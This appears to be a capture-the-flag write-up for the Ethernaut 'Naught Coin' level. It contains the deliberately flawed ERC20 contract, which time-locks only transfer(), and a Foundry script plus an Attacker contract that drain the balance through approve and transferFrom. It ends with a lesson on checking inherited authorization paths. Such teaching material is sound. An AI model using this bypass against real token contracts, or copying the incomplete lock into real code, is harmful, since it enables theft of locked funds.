---
title: "Naught Coin"
date: "2024-02-23"
lastmod: "2024-02-23T15:25:00.000Z"
draft: false
difficulty: "⭐⭐⭐⭐"
prev: "GateKeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
weight: 16
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/15"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "5013cfef-45d6-46e6-93a6-feaac127ac33"
  created_time: "2024-02-23T14:37:00.000Z"
  last_edited_time: "2024-02-23T15:25:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "f9c2f40a-0144-4e6d-a134-6b9fd725f7a9"
        name: "⭐⭐⭐⭐"
        color: "red"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "GateKeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "GateKeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-23"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 16
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/15"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text: []
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Naught Coin"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Naught Coin"
          href: null
  url: "https://www.notion.so/Naught-Coin-5013cfef45d646e693a6feaac127ac33"
  public_url: null
UPDATE_TIME: "2024-02-23T22:49:38.509Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


NaughtCoin is an
 ERC20 token and you're already holding all of them. The catch is that 
you'll only be able to transfer them after a 10 year lockout period. Can
 you figure out how to get them out to another address so that you can 
transfer them freely? Complete this level by getting your token balance 
to 0.


Things that might help

- The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
- The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,NaughtCoin} from "../src/15.sol";

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address publicKey = vm.envAddress("PUBLIC_KEY");
        address addr = vm.envAddress("INSTANCE_15");

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker();
        NaughtCoin nc = NaughtCoin(addr);

        nc.approve(address(attacker), nc.balanceOf(publicKey));

        attacker.attack(address(nc));

        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface NaughtCoin {
  function transfer(address _to, uint256 _value) external returns(bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

contract Attacker {
  function attack(address _addr) public {
    NaughtCoin nc = NaughtCoin(_addr);
    nc.transferFrom(msg.sender, address(this), nc.balanceOf(msg.sender));
  }
}
```


When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might  scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.

